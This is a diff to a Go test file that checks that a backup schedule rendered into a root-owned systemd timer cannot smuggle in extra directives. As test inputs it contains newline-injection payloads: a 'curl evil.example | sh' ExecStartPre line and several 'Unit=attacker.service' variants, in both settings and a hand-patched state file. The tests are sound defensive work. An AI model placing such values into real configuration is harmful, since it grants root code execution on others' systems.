@@ -58,8 +58,14 @@ func TestARepairKeepsWhatTheOperatorConfigured(t *testing.T) {
 	inst.Policy.BackupSchedule = "Mon *-*-* 04:00:00"
 	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))
 
+	// A schedule of spaces is "not given", not "blank it". `--backup-schedule`
+	// outranks the carried Policy when it was supplied, so testing that on the
+	// untrimmed value would make a stray quoted space delete the maintenance
+	// window this repair exists to preserve -- and a whitespace-only value is
+	// non-empty, so it would also be stored and shown back by `config get`.
 	_, err = ops.Init(ctx, h.Deps, ops.InitOptions{
 		Product: "demo", Repair: true, RecoveryRecipient: recoveryPub,
+		BackupSchedule: "   ",
 	})
 	require.NoError(t, err)
 
@@ -165,27 +171,123 @@ func TestTheBackupWindowCanBeChangedAfterInit(t *testing.T) {
 // A schedule reaches a root-owned unit file, so it is bounded like anything
 // else that does.
 //
-// It used to arrive only from argv at `init`. Persisting it means it also
-// arrives from installation.yaml, which is a file an operator can hand-edit and
-// which a support bundle carries -- and `OnCalendar={{.BackupSchedule}}` is a
-// line in a systemd unit. A value with a newline in it is a second directive.
+// It used to arrive only from argv at `init`. Persisting it means every later
+// reconciliation reads it back out of the manager's state file and renders it
+// again, without revisiting the door it came in through -- and
+// `OnCalendar={{.BackupSchedule}}` is a line in a systemd unit. A value with a
+// newline in it is a second directive.
 func TestAScheduleCannotSmuggleADirectiveIntoTheUnit(t *testing.T) {
+	// Where the newline sits decides whether a trim-then-scan guard sees it.
+	// The interior case is the one anybody writes first; a *leading* one is
+	// removed by the trim before the scan runs, and what reaches the unit file
+	// is the raw value, newline and all. `Unit=` in a [Timer] section names
+	// what the timer starts, so that spelling needs no shell to be worth
+	// refusing.
+	//
+	// A harness each, deliberately. Sharing one made a case that wrote a value
+	// leave it behind for the next, which reported the leftover as its own
+	// failure and hid which payload actually got through.
+	for name, payload := range map[string]string{
+		"a directive on a second line":        "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'",
+		"a directive after a leading newline": "\nUnit=attacker.service",
+		"a leading carriage return":           "\rUnit=attacker.service",
+		"a directive after a leading tab":     "\tUnit=attacker.service",
+		"a trailing newline and a directive":  "daily\nUnit=attacker.service\n",
+	} {
+		t.Run(name, func(t *testing.T) {
+			h := newHarness(t)
+			h.install()
+			ctx := context.Background()
+
+			_, err := ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
+				Set: map[string]string{"backup.schedule": payload},
+			})
+
+			inst, loadErr := h.Deps.State.LoadInstallation(ctx)
+			require.NoError(t, loadErr)
+			stored := inst.Policy.BackupSchedule
+
+			// The property, not the mechanism. Two outcomes are correct and
+			// which one an operator meets depends on where the line break
+			// sits: this door trims before it validates, so leading and
+			// trailing whitespace is stripped rather than refused -- the
+			// ergonomics of `--backup-schedule "$(cat window.txt)"`. What is
+			// never correct is a stored value that still carries the break.
+			if err != nil {
+				assert.Contains(t, domain.AsError(err).Message, "one line")
+				assert.Empty(t, stored,
+					"the refusal wrote the value anyway, which is what it was refusing")
+				return
+			}
+
+			assert.NotContains(t, stored, "\n",
+				"a schedule carrying a line break was stored and will be rendered")
+			assert.NotContains(t, stored, "\r",
+				"a schedule carrying a carriage return was stored and will be rendered")
+
+			// And the unit that value produces has the directives it should.
+			unitDir := t.TempDir()
+			real := systemd.New(exec.NewScripted(), systemd.WithUnitDir(unitDir))
+			units, unitsErr := real.Units(ports.UnitParams{
+				Product: "demo", BackupSchedule: stored,
+			})
+			require.NoError(t, unitsErr)
+			require.NoError(t, real.InstallUnits(ctx, units))
+			assert.NotContains(t, unitText(t, unitDir), "\nUnit=attacker.service",
+				"the schedule opened a second directive in the timer unit")
+		})
+	}
+}
+
+// The injection, played out against the real unit file.
+//
+// `config set` trims before it validates, so that door stored a mangled value
+// rather than a newline. `init --backup-schedule` assigned what it was given,
+// and `SaveInstallation` validated through a guard that trimmed its own copy
+// first -- so a leading newline survived validation, survived the state file,
+// and arrived at `OnCalendar={{.BackupSchedule}}` intact. It rendered as
+//
+//	[Timer]
+//	OnCalendar=
+//	Unit=attacker.service
+//
+// and `Unit=` in a [Timer] section names what the timer starts: root running
+// something else on a schedule, from an `init` flag or a state file.
+//
+// Three guards now, and this asserts each separately, because any one of them
+// alone would leave a door: the writer refuses it, the loader refuses it, and
+// the renderer -- the thing that actually writes as root -- refuses it for a
+// caller nobody has written yet.
+func TestALeadingNewlineDoesNotReachTheUnitFile(t *testing.T) {
 	h := newHarness(t)
-	h.install()
+	inst := h.install()
 	ctx := context.Background()
 
-	_, err := ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
-		Set: map[string]string{
-			"backup.schedule": "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'",
-		},
-	})
-	require.Error(t, err, "a schedule carrying a second unit directive was accepted")
-	assert.Contains(t, domain.AsError(err).Message, "one line")
+	const payload = "\nUnit=attacker.service"
 
-	inst, err := h.Deps.State.LoadInstallation(ctx)
+	// The renderer, which is the guard nearest the root-owned file.
+	unitDir := t.TempDir()
+	real := systemd.New(exec.NewScripted(), systemd.WithUnitDir(unitDir))
+	_, err := real.Units(ports.UnitParams{Product: "demo", BackupSchedule: payload})
+	require.Error(t, err,
+		"the renderer accepted a schedule that would add a directive to the unit")
+
+	// And a whitespace-only schedule is not a schedule: an exact `== ""`
+	// check would skip the nightly default and render `OnCalendar=` with
+	// nothing after it, which systemd refuses to load.
+	units, err := real.Units(ports.UnitParams{Product: "demo", BackupSchedule: "   "})
 	require.NoError(t, err)
-	assert.Empty(t, inst.Policy.BackupSchedule,
-		"the refusal wrote the value anyway, which is what it was refusing")
+	require.NoError(t, real.InstallUnits(ctx, units))
+	assert.Equal(t, "OnCalendar="+systemd.DefaultBackupSchedule, onCalendar(t, unitDir),
+		"a schedule of spaces produced an OnCalendar systemd will not load")
+
+	// And the state file refuses it, which is the guard that should mean the
+	// renderer never sees it.
+	inst.Policy.BackupSchedule = payload
+	err = h.Deps.State.SaveInstallation(ctx, inst)
+	require.Error(t, err,
+		"a schedule whose first character is a newline was written to the state file")
+	assert.Contains(t, domain.AsError(err).Message, "one line")
 }
 
 // Every field of an installation is classified for a repair.
@@ -261,6 +363,15 @@ type availableSupervisor struct{ *systemd.Supervisor }
 func (availableSupervisor) Available(context.Context) bool { return true }
 
 // onCalendar reads the schedule out of the installed backup timer.
+// unitText returns the rendered backup timer, for the assertions that are about
+// the file rather than about one field of it.
+func unitText(t *testing.T, unitDir string) string {
+	t.Helper()
+	body, err := os.ReadFile(filepath.Join(unitDir, "demo-backup.timer"))
+	require.NoError(t, err)
+	return string(body)
+}
+
 func onCalendar(t *testing.T, unitDir string) string {
 	t.Helper()
 	body, err := os.ReadFile(filepath.Join(unitDir, "demo-backup.timer"))
@@ -276,18 +387,42 @@ func onCalendar(t *testing.T, unitDir string) string {
 
 // The same refusal on the path the guard actually exists for.
 //
-// `config set` is one way a schedule arrives; the other is somebody editing
-// installation.yaml, and that is the one the bound was written against -- the
-// value is rendered into `OnCalendar=` in a root-owned unit file. A guard that
-// only covered the command would have been a guard over the door nobody was
-// coming through, and the comment beside it would have been false.
+// `config set` is one way a schedule arrives; the other is a value already in
+// the state file, which is where `unitParams` reads it from and which no
+// command has to have written. The bound exists for that one -- the value is
+// rendered into `OnCalendar=` in a root-owned unit file -- so it is asserted by
+// writing the state directly and reading it back, rather than by handing a bad
+// value to the writer. A guard proved only against `SaveInstallation` is a
+// guard over the door this threat does not come through.
 func TestAHandEditedScheduleIsRefusedOnLoad(t *testing.T) {
 	h := newHarness(t)
 	inst := h.install()
 	ctx := context.Background()
 
+	// A real state file first, so what is patched below is the shape the
+	// store actually writes rather than one this test invented.
+	inst.Policy.BackupSchedule = "daily"
+	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))
+
+	path := h.Deps.Paths.InstallationState()
+	raw, err := os.ReadFile(path)
+	require.NoError(t, err)
+	require.Contains(t, string(raw), `"backup_schedule": "daily"`,
+		"the state file does not hold the schedule where this test patches it")
+
+	patched := strings.Replace(string(raw),
+		`"backup_schedule": "daily"`,
+		`"backup_schedule": "daily\nUnit=attacker.service"`, 1)
+	require.NoError(t, os.WriteFile(path, []byte(patched), 0o600))
+
+	_, err = h.Deps.State.LoadInstallation(ctx)
+	require.Error(t, err,
+		"a state file carrying a second unit directive was loaded and would be rendered")
+	assert.Contains(t, domain.AsError(err).Message, "backup_schedule")
+
+	// And the writer refuses it too, which is the cheaper of the two.
 	inst.Policy.BackupSchedule = "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'"
-	err := h.Deps.State.SaveInstallation(ctx, inst)
+	err = h.Deps.State.SaveInstallation(ctx, inst)
 	require.Error(t, err, "an installation carrying a second unit directive was written")
 	assert.Contains(t, domain.AsError(err).Message, "backup_schedule")
 }
